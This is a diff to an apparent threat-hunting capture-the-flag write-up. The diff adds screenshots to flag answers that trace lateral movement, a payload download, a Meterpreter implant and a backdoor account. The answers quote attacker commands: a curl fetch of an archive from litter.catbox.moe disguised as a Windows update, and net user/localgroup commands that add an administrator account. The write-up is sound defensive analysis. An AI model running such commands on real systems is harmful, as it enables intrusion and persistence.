@@ -211,7 +211,7 @@ DeviceLogonEvents
 
 **Output:** `10.1.0.204`  
 **Finding:** The repeated logons from “10.1.0.204” to “azuki-adminpc” (a device name containing "azuki") strongly indicate lateral movement from this IP. The subnet mismatch (10.1.x.x vs. 10.0.8.x) further supports this as an external pivot point. No conflicting or ambiguous data exists in the provided results.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="724" height="290" alt="image" src="https://github.com/user-attachments/assets/2a8a7b06-48f9-4fe0-bbf0-db52dc28723d" />
 
 ---
 
@@ -241,7 +241,7 @@ DeviceLogonEvents
 
 **Output:** `yuki.tanaka`  
 **Finding:** The logs show four RemoteInteractive logon events to device 'azuki-adminpc' from IP 10.1.0.204 (Flag 1) using the same AccountName 'yuki.tanaka'. This indicates the attacker is using this account for lateral movement across the network. The consistent AccountName across multiple logons confirms it as the primary attack vector.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="784" height="158" alt="image" src="https://github.com/user-attachments/assets/55a7aafe-17d1-4e88-9f19-3ed6b060c5e2" />
 
 ---
 
@@ -271,7 +271,7 @@ DeviceLogonEvents
 
 **Output:** `azuki-adminpc`  
 **Finding:** This device name correlates with previous flags (Flag 1: 10.1.0.204, Flag 2: yuki.tanaka) as part of the same network/session context. The account yuki.tanaka is associated with remote logons to this device. The KQL query explicitly filters for DeviceName containing 'azuki' and all four log entries show 'azuki-adminpc' as the DeviceName. This matches the objective of finding the target device name. No decoding/parsing was required as the DeviceName field is already clear text.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="720" height="163" alt="image" src="https://github.com/user-attachments/assets/ed7c2130-882e-4bd3-8fad-c6ca512042d8" />
 
 ---
 
@@ -301,7 +301,7 @@ DeviceNetworkEvents
 
 **Output:** `litter.catbox.moe`  
 **Finding:** reasonable based on catbox's known abuse pattern for malware staging, but still not fully proven from the 5 rows alone since no file-write correlation was in the query results. If you want to lock this to High confidence, pulling DeviceFileEvents on azuki-adminpc for the 04:15–04:45 UTC window would show which download was immediately followed by a new file on disk.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="731" height="183" alt="image" src="https://github.com/user-attachments/assets/9b3fb6e6-4f4a-4962-9148-4168fb07afaa" />
 
 ---
 
@@ -330,7 +330,7 @@ DeviceProcessEvents
 
 **Output:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`  
 **Finding:** The flag question seeks the exact command-line instruction used to download a malicious archive disguised as a Windows security update (KB format). The query results reveal two `curl.exe` commands downloading `.7z` files from `litter.catbox.moe`, a known hosting service for malicious payloads. The filenames `KB5044273-x64.7z` and `mt97cj.7z` align with the KB format and suspicious archive patterns. The second command explicitly uses a KB-named file, matching the context of a security update mimic.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="744" height="108" alt="image" src="https://github.com/user-attachments/assets/f59dc376-6b9b-4dcd-a566-aa514d321b0f" />
 
 ---
 
@@ -359,7 +359,7 @@ DeviceProcessEvents
 
 **Output:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`  
 **Finding:** The flag question requires identifying the exact command-line used to extract a password-protected archive. The critical clues are:
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1274" height="156" alt="image" src="https://github.com/user-attachments/assets/f8c3a7cd-28d3-45cd-b03d-a2be900463e6" />
 
 ---
 
@@ -388,7 +388,7 @@ DeviceProcessEvents
 
 **Output:** `meterpreter.exe`  
 **Finding:** The flag question seeks the filename of a C2 beacon, a persistent backdoor tool often hidden in cache directories after archive extraction. The query results show multiple files, but the key is to focus on:
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1286" height="271" alt="image" src="https://github.com/user-attachments/assets/89ec58cd-1d57-4815-9a79-811b0b5074a6" />
 
 ---
 
@@ -417,7 +417,7 @@ DeviceEvents
 
 **Output:** `\\Device\\NamedPipe\\msf-pipe-5902`  
 **Finding:** The flag question specifically asks for the named pipe created by the C2 implant. The **AdditionalFields** column in the query results contains the `PipeName` field, which directly answers the question. Both rows reference named pipes created by `meterpreter.exe`, which is the C2 implant (as confirmed in Flag 7). However, the **first row** (`\\Device\\NamedPipe\\msf-pipe-5902`) is associated with an earlier timestamp (04:24:35) and aligns with the timeline of the C2 implant's activity (e.g., after `meterpreter.exe` execution). The second row (`\\Device\\NamedPipe\\msf-pipe-5722`) is later (05:36:54) but still falls within the same operational window.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1283" height="97" alt="image" src="https://github.com/user-attachments/assets/7bc74b77-df13-4db9-ac88-5e11b1e64964" />
 
 ---
 
@@ -445,7 +445,8 @@ DeviceProcessEvents
 
 **Output:** `net user yuki.tanaka2 B@ckd00r2024! /add`  
 **Finding:** The account name yuki.tanaka2 is a variant/lookalike of the
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1247" height="130" alt="image" src="https://github.com/user-attachments/assets/c8cd7cdb-6729-45bf-bac9-48dd24b06ee8" />
+<img width="715" height="543" alt="image" src="https://github.com/user-attachments/assets/e58af746-b224-4127-a960-cbc13606f593" />
 
 ---
 
@@ -473,7 +474,8 @@ DeviceProcessEvents
 
 **Output:** `yuki.tanaka2`  
 **Finding:** Row 3's Base64 decodes to: "net localgroup Administrators yuki.tanaka2 /add" — this immediately grants
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1236" height="127" alt="image" src="https://github.com/user-attachments/assets/210507d3-fa9f-4935-95ad-f64074934757" />
+<img width="711" height="501" alt="image" src="https://github.com/user-attachments/assets/ad8510d9-656b-4bdd-8038-b306e00a0029" />
 
 ---
 
